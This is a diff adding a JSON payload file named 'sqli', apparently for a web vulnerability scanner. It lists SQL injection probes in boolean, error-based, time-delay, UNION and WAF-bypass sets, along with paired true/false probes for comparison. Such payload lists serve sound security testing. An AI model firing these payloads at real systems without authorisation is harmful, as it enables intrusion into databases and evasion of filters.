@@ -1,0 +1,73 @@
+{
+  "name": "sqli",
+  "说明": "无害布尔/错误/时间/联合/绕过探针。用法：job 里写 \"payloads_from\": [\"sqli:boolean\", \"sqli:error\"]",
+  "sets": {
+    "boolean": [
+      "1 AND 1=1",
+      "1 AND 1=2",
+      "1 AND 2>1",
+      "1 AND 2<1",
+      "1 AND 0",
+      "1 OR 0",
+      "1 OR 1"
+    ],
+    "control": [
+      "1"
+    ],
+    "error": [
+      "1'",
+      "1\"",
+      "1' AND '1'='1",
+      "1')",
+      "1\\",
+      "1 AND extractvalue(1,concat(0x7e,version()))",
+      "1 AND updatexml(1,concat(0x7e,version()),1)",
+      "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
+    ],
+    "time": [
+      "1 AND SLEEP(0)",
+      "1 AND SLEEP(3)",
+      "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)",
+      "1' AND SLEEP(3) AND '1'='1",
+      "1;SELECT pg_sleep(3)--",
+      "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)",
+      "1';WAITFOR DELAY '0:0:3'--"
+    ],
+    "union": [
+      "1 UNION SELECT 1",
+      "1 UNION ALL SELECT 1",
+      "1 UNION SELECT 1,2",
+      "1 UNION SELECT 1,2,3",
+      "1 UNION SELECT 1,2,3,4",
+      "1 UNION SELECT NULL",
+      "-1 UNION SELECT 1"
+    ],
+    "waf_bypass": [
+      "1/**/AND/**/1=1",
+      "1/*!AND*/1=1",
+      "1/*!50000AND*/1=1",
+      "1%20AND%201=1",
+      "1%09AND%091=1",
+      "1+AND+1=1",
+      "1%0aAND%0a1=1",
+      "1 ANd 1=1",
+      "1 UNunionION SELECT 1",
+      "1 union%23%0aselect 1"
+    ]
+  },
+  "pairs": {
+    "boolean": [
+      ["1 AND 1=1", "1 AND 1=2"],
+      ["1 AND 2>1", "1 AND 1>2"],
+      ["1 OR 1=1", "1 OR 1=2"],
+      ["1/*!AND*/1=1", "1/*!AND*/1=2"]
+    ],
+    "time": [
+      ["1 AND SLEEP(0)", "1 AND SLEEP(3)"],
+      ["1' AND SLEEP(0) AND '1'='1", "1' AND SLEEP(3) AND '1'='1"]
+    ],
+    "error": [
+      ["1'", "1''"]
+    ]
+  }
+}
